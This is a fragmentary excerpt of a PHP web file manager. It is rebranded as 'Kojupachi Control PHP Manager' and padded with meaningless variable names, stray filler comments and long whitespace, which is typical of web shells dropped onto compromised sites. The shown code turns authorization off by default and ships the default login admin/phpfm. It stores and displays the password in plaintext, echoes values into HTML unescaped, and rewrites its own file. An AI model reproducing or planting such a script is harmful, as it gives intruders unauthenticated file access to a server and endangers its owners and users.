<?php
                                  ...
                                  /* Kojupachi Control PHP Manager 14.7 */
   ...
   $authorizationLorca = '{"authorize":"0","login":"admin","password":"phpfm",
...
$auth_calica = json_decode($authorizationLorca,true);
$auth_calica['authorize'] = isset($auth_calica['authorize']) ? $auth_calica['authorize'] : 0; 
                                                                                                                                         
$auth_calica['days_authorization'] = (isset($auth_calica['days_authorization'])&&is_numeric($auth_calica['days_authorization'])) ? (int)$auth_calica['days_authorization'] : 30;
$auth_calica['login'] = isset($auth_calica['login']) ? $auth_calica['login'] : 'admin';  

$auth_calica['password'] = isset($auth_calica['password']) ? $auth_calica['password'] : 'phpfm';  
                                                                                                                                    
$auth_calica['cookie_name'] = isset($auth_calica['cookie_name']) ? $auth_calica['cookie_name'] : 'fm_user';
                                                                                                                                             
$auth_calica['script'] = isset($auth_calica['script']) ? $auth_calica['script'] : '';
...
// He used to get confused between soldiers and shoulders
                                                                                                                                          
if (isset($_POST['fm_lang'])) { 
                                                                                                                                                                  
	             setcookie('fm_lang', $_POST['fm_lang'], time() + (86400 * $auth_calica['days_authorization']));
...
// authorization
if ($auth_calica['authorize']) {

	             if (isset($_POST['login']) && isset($_POST['password'])){
	             	             if (($_POST['login']==$auth_calica['login']) && ($_POST['password']==$auth_calica['password'])) {

	             	             	             setcookie($auth_calica['cookie_name'], $auth_calica['login'].'|'.md5($auth_calica['password']), time() + (86400 * $auth_calica['days_authorization']));

	             	             	             $_COOKIE[$auth_calica['cookie_name']]=$auth_calica['login'].'|'.md5($auth_calica['password']);

	             	             }

	             }

	             if (!isset($_COOKIE[$auth_calica['cookie_name']]) OR ($_COOKIE[$auth_calica['cookie_name']]!=$auth_calica['login'].'|'.md5($auth_calica['password']))) {
	             	             echo '
...
die();
	             ...
	             if (isset($_POST['quit'])) {
	             	             unset($_COOKIE[$auth_calica['cookie_name']]);

	             	             setcookie($auth_calica['cookie_name'], '', time() - (86400 * $auth_calica['days_authorization']));
...
if (isset($_GET['fm_settings'])) {
	             ...
	             if (isset($_GET['fm_config_delete'])) { 
	             	             ...
	             	             setcookie('fm_config', '', time() - (86400 * $auth_calica['days_authorization']));
	             	             ...
	             	             setcookie('fm_config', serialize($fm_config), time() + (86400 * $auth_calica['days_authorization']));
	             	             ...
	             	             if (!empty($matches[1])) {
	             	             	             ...
	             	             	             if (file_put_contents(__FILE__, $replace)) {
	             	             	             	             $msg_headers .= __('File updated');
	             	             	             	             if ($_POST['fm_login']['login'] != $auth_calica['login']) $msg_headers .= ' '.__('Login').': '.$_POST['fm_login']['login'];
                                                                                                                                                              
	             	             	             	             if ($_POST['fm_login']['password'] != $auth_calica['password']) $msg_headers .= ' '.__('Password').': '.$_POST['fm_login']['password'];
                                                                                                                                         
	             	             	             	             $auth_calica = $_POST['fm_login'];
...
<tr><td class="row1"><input name="fm_login[authorize]" value="1" '.($auth_calica['authorize']?'checked':'').' type="checkbox" id="auth"></td><td class="row2 whole"><label for="auth">'.__('Authorization').'</label></td></tr>
                                                                                                                                                            
<tr><td class="row1"><input name="fm_login[login]" value="'.$auth_calica['login'].'" type="text"></td><td class="row2 whole">'.__('Login').'</td></tr>

<tr><td class="row1"><input name="fm_login[password]" value="'.$auth_calica['password'].'" type="text"></td><td class="row2 whole">'.__('Password').'</td></tr>

<tr><td class="row1"><input name="fm_login[cookie_name]" value="'.$auth_calica['cookie_name'].'" type="text"></td><td class="row2 whole">'.__('Cookie').'</td></tr>

<tr><td class="row1"><input name="fm_login[days_authorization]" value="'.$auth_calica['days_authorization'].'" type="text"></td><td class="row2 whole">'.__('Days').'</td></tr>

<tr><td class="row1"><textarea name="fm_login[script]" cols="35" rows="7" class="textarea_input" id="auth_script">'.$auth_calica['script'].'</textarea></td><td class="row2 whole">'.__('Script').'</td></tr>
...
<tr>
    ...
    <td class="row3">
	             	             ...
	             	             <?php if ($auth_calica['authorize']) { ?>
	             	             	             <form action="" method="post">&nbsp;&nbsp;&nbsp;
                                                                                                                                                                  
	             	             	             <input name="quit" type="hidden" value="1">

	             	             	             <?=__('Hello')?>, <?=$auth_calica['login']?>
